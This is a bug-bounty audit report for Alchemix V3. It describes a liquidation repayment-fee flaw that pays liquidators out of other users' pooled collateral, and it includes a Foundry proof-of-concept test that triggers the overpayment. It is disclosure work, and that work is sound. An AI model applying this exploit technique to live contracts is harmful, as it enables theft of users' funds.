# 58793 sc critical repayment fee overpayment from global collateral pool

**Submitted on Nov 4th 2025 at 13:49:47 UTC by @ayeslick for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58793
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The liquidation repayment path in AlchemistV3 lets a liquidator collect the full repayment fee even when the victim account cannot cover it. The shortfall comes out of the protocol’s global MYT balance (i.e., other users’ collateral), making the issue a direct-in-loss for the protocol.

## Vulnerability Details

The `_resolveRepaymentFee(`) function calculates a fee based on the repaid amount, but when the victim's collateral is insufficient to cover the full fee, it only deducts `min(fee, account.collateralBalance)` from the victim's account. However, it returns the full computed fee amount, which is then transferred to the liquidator from the contract's global MYT balance.

```solidity
(uint256 assets, uint256 feeInYield, ) = alchemist.liquidate(victimTokenId);
...
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
```

## Impact Details

Other users' MYT is stolen from the global pool to pay liquidator fees.

Every liquidation where the victim’s collateral is below the computed fee creates a gap that is paid from the contract’s aggregate MYT reserves.

When the victim has less collateral than the fee, the excess comes from the transmuter’s or protocol’s MYT holdings — effectively stealing from other users.

## Proof of Concept

## Proof of Concept

```solidity
function testLiquidate_RepaymentFee_Overpays_WithoutStorageTricks() external {
    // Make the repayment fee large to magnify the gap (50%)
    vm.prank(alOwner);
    alchemist.setRepaymentFee(5_000);

    // Keep system collateralized so the victim’s shortfall comes from protocol funds
    vm.startPrank(yetAnotherExternalUser);
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
    vm.stopPrank();

    // Victim: deposit and borrow
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, address(0xbeef), 0);
    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    uint256 mintAmount = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
    alchemist.mint(tokenId, mintAmount, address(0xbeef));
    vm.stopPrank();

    // Earmark the entire debt via the transmuter
    vm.startPrank(anotherExternalUser);
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
    transmuterLogic.createRedemption(mintAmount);
    vm.stopPrank();
    vm.roll(block.number + 5_256_000); // full maturation

    (uint256 collateralBefore, uint256 debtBefore, uint256 earmarked) = alchemist.getCDP(tokenId);
    require(earmarked == debtBefore && earmarked > 0, "earmark incomplete");

    // Crash the vault share price so convertDebtTokensToYield explodes
    uint256 initialSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialSupply * 1_000_000);

    uint256 liqBalBefore = IERC20(address(vault)).balanceOf(externalUser);
    uint256 alchemistBalBefore = IERC20(address(vault)).balanceOf(address(alchemist));

    vm.startPrank(externalUser);
    (uint256 repaidYield, uint256 feeYield, uint256 feeUnderlying) = alchemist.liquidate(tokenId);
    vm.stopPrank();
    require(feeUnderlying == 0, "unexpected underlying fee");

    (uint256 collateralAfter, uint256 debtAfter,) = alchemist.getCDP(tokenId);
    uint256 liqBalAfter = IERC20(address(vault)).balanceOf(externalUser);
    uint256 alchemistBalAfter = IERC20(address(vault)).balanceOf(address(alchemist));

    uint256 collateralDeducted = collateralBefore - collateralAfter;
    uint256 payout = liqBalAfter - liqBalBefore;
    uint256 alchemistDelta = alchemistBalBefore - alchemistBalAfter;

    // debt cleared purely via earmark repayment
    assertEq(debtAfter, 0, "debt should be zero after force repay");
    // victim’s collateral goes to zero; fee can’t be covered
    assertEq(collateralAfter, 0, "victim collateral exhausted by force repay");
    assertEq(repaidYield, collateralDeducted, "repay consumed everything victim held");
    // fee is positive even though no collateral remains
    assertGt(feeYield, 0, "repayment fee is non-zero");
    // protocol pays the fee directly to liquidator
    assertEq(payout, feeYield, "liquidator received the entire fee from global pool");
    // global pool lost repay + fee; victim only supplied the repay amount
    assertEq(alchemistDelta, repaidYield + feeYield, "global pool subsidized the fee");
}
```
